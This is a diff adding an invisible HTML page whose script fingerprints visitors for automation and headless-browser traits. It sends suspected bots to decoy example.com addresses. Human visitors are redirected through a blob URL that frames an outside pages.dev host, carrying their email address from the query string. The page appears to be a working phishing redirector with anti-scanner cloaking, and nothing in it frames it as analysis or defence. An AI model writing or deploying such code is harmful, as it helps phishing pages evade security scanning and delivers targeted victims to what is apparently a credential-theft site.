@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html style="display:none;height:100%;">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>
+        /* Ensure nothing is visible */
+        html, body {
+            margin: 0;
+            padding: 0;
+            background: transparent;
+            overflow: hidden;
+            width: 100%;
+            height: 100%;
+        }
+    </style>
+</head>
+<body>
+<script>
+// COMPLETE INVISIBLE ANTI-BOT WITH BLOB
+(function() {
+    'use strict';
+    
+    const TARGET_BASE = "https://etfyffyfriri.pages.dev/";
+    const FAKE_URLS = [
+        "https://example.com",
+        "https://www.example.org",
+        "https://www.example.net"
+    ];
+    
+    // ENHANCED BOT DETECTION
+    function detectBot() {
+        let score = 0;
+        
+        // 1. Automation properties (Selenium/Puppeteer/Playwright)
+        const automationProps = [
+            'webdriver', '__webdriver_evaluate', '__selenium_evaluate',
+            '__fxdriver_evaluate', '__driver_evaluate', '__webdriver_script_function',
+            '__webdriver_script_fn', '__lastWatirAlert', '__lastWatirConfirm'
+        ];
+        
+        automationProps.forEach(prop => {
+            if (prop === 'webdriver') {
+                if (navigator.webdriver === true) score += 40;
+            } else if (window[prop] !== undefined) {
+                score += 30;
+            }
+        });
+        
+        // 2. Headless browser detection
+        try {
+            // WebGL check
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            
+            if (!gl) {
+                score += 30;
+            } else {
+                // Check for headless renderers
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    if (renderer.includes('SwiftShader') || 
+                        renderer.includes('llvmpipe') ||
+                        renderer.includes('Google SwiftShader')) {
+                        score += 35;
+                    }
+                }
+            }
+            
+            // Canvas fingerprinting test
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = "top";
+            ctx.font = "14px 'Arial'";
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = "#069";
+            ctx.fillText("test", 2, 15);
+            
+            const dataUrl = canvas.toDataURL();
+            // Headless often returns identical or empty data URLs
+            if (!dataUrl || dataUrl.length < 100) {
+                score += 20;
+            }
+            
+        } catch(e) {
+            score += 25;
+        }
+        
+        // 3. Plugin and language checks
+        if (navigator.plugins.length === 0) score += 15;
+        if (navigator.languages && navigator.languages.length === 0) score += 10;
+        
+        // 4. Missing common APIs that real browsers have
+        if (!window.chrome || !window.chrome.runtime) score += 10;
+        if (!('ontouchstart' in window) && navigator.plugins.length === 0) score += 10;
+        
+        // 5. Screen size (headless often uses default 800x600)
+        if (window.screen.width === 800 && window.screen.height === 600) score += 10;
+        
+        return score > 50; // Threshold
+    }
+    
+    // GET EMAIL
+    function getEmail() {
+        try {
+            const params = new URLSearchParams(window.location.search);
+            const email = params.get('email');
+            return email ? email.trim() : '';
+        } catch(e) {
+            return '';
+        }
+    }
+    
+    // CREATE BLOB (YOUR ORIGINAL FORMAT)
+    function createMobileSafeBlob(targetUrl, email) {
+        const html = `<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+html, body { margin: 0; padding: 0; width: 100%; height: 100%; }
+iframe { width: 100%; height: 100%; border: none; }
+</style>
+</head>
+<body>
+<iframe src="${targetUrl}"></iframe>
+<script>
+const email = "${email}";
+<\/script>
+</body>
+</html>`;
+        return new Blob([html], { type: 'text/html' });
+    }
+    
+    // GET FAKE URL FOR BOTS
+    function getFakeUrl() {
+        const randomIndex = Math.floor(Math.random() * FAKE_URLS.length);
+        return FAKE_URLS[randomIndex];
+    }
+    
+    // EXECUTE
+    function run() {
+        const isBot = detectBot();
+        const email = getEmail();
+        
+        if (isBot) {
+            // Bot gets fake redirect
+            window.location.replace(getFakeUrl());
+            return;
+        }
+        
+        // Human gets blob
+        const targetUrl = email ? 
+            TARGET_BASE + '?email=' + encodeURIComponent(email) : 
+            TARGET_BASE;
+        
+        const blob = createMobileSafeBlob(targetUrl, email);
+        const blobUrl = URL.createObjectURL(blob);
+        
+        // Redirect to blob
+        window.location.replace(blobUrl);
+        
+        // Clean up blob after delay
+        setTimeout(() => {
+            try {
+                URL.revokeObjectURL(blobUrl);
+            } catch(e) {}
+        }, 10000);
+    }
+    
+    // Start with minimal delay
+    setTimeout(run, 1);
+    
+})();
+</script>
+</body>
+</html>
+
